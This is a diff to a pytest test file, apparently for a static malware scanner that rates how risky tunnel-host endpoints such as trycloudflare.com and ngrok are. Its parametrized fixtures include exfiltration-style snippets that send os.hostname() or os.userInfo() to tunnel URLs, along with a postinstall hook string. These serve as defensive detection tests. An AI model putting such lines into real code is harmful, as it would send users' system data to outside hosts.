@@ -269,8 +269,9 @@ def test_a_placeholder_tunnel_host_is_low(text: str) -> None:
         "fetch('https://purple-river-1234.trycloudflare.com/c')",  # a real quick-tunnel name
         "https://sidebar.ngrok.io/x",  # a word, not a placeholder label
         "https://myexample.ngrok.io/x",
-        # a bare suffix in a file that collects (v8 lowers it in one that doesn't)
-        "if (h.endsWith('.trycloudflare.com')) go(os.hostname())",
+        # a bare suffix in a file that collects (v8 lowers it in one that doesn't; v10 in a host
+        # check, `endsWith`)
+        "const TUNNEL = '.trycloudflare.com'; go('https://' + h + TUNNEL, os.hostname())",
         "require('child_process'); x = 'https://example.com/webhook.site'",  # not a tunnel host
     ],
 )
@@ -461,7 +462,7 @@ def test_what_names_no_endpoint_in_a_quiet_file_is_low(text: str, note: str) -> 
         # a real quick-tunnel name, a TCP tunnel, a bare suffix in a file that collects
         "fetch('https://purple-river-1234.trycloudflare.com/c')",
         "client.connect(13532, '0.tcp.in.ngrok.io', () => {})",
-        "if (h.endsWith('.trycloudflare.com')) send(os.userInfo())",
+        "u = 'https://' + h + '.trycloudflare.com'; send(u, os.userInfo())",
     ],
 )
 def test_what_is_sent_keeps_high(text: str) -> None:
@@ -924,4 +925,36 @@ def test_an_html_escaped_telegram_placeholder_is_documentation() -> None:
     ],
 )
 def test_v9_lists_keep_what_can_be_an_endpoint(text: str) -> None:
+    assert ("high", 5.0) in _exfil(text)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        'const cp = require("child_process"); if (!hostname.endsWith(".trycloudflare.com")) x();',
+        "const cp = require('child_process');"
+        " vite: { server: { allowedHosts: ['a.local', '.ngrok.app'] } }",
+        "readdirSync(d);"
+        " log('Or start Vite with __VITE_ADDITIONAL_SERVER_ALLOWED_HOSTS=.trycloudflare.com')",
+        "import os\nif host.endswith('.ngrok-free.app'):\n    os.system('x')",
+    ],
+)
+def test_a_tunnel_suffix_in_a_host_check_is_low(text: str) -> None:
+    """v10 (round 6, P1): a suffix a host check or an allowed-hosts setting names is no
+    tunnel, even in a file that collects."""
+    matches = [m for m in analyse(text.encode()) if m.rule_id == "static.exfil-endpoint"]
+    assert [(m.severity.value, m.weight) for m in matches] == [("low", 1.0)]
+    assert "host check" in matches[0].explanation
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "const cp = require('child_process'); u = 'https://' + id + '.trycloudflare.com'",
+        "readdirSync(d); if (h.endsWith('calm-river-lake-one.trycloudflare.com')) send()",
+        "readdirSync(d); const TUNNEL = '.trycloudflare.com'; u = 'https://' + n + TUNNEL",
+        '  "postinstall": "node -e \\"h.endsWith(\'.ngrok.io\')\\""',
+    ],
+)
+def test_a_tunnel_suffix_outside_a_host_check_stays_high(text: str) -> None:
     assert ("high", 5.0) in _exfil(text)
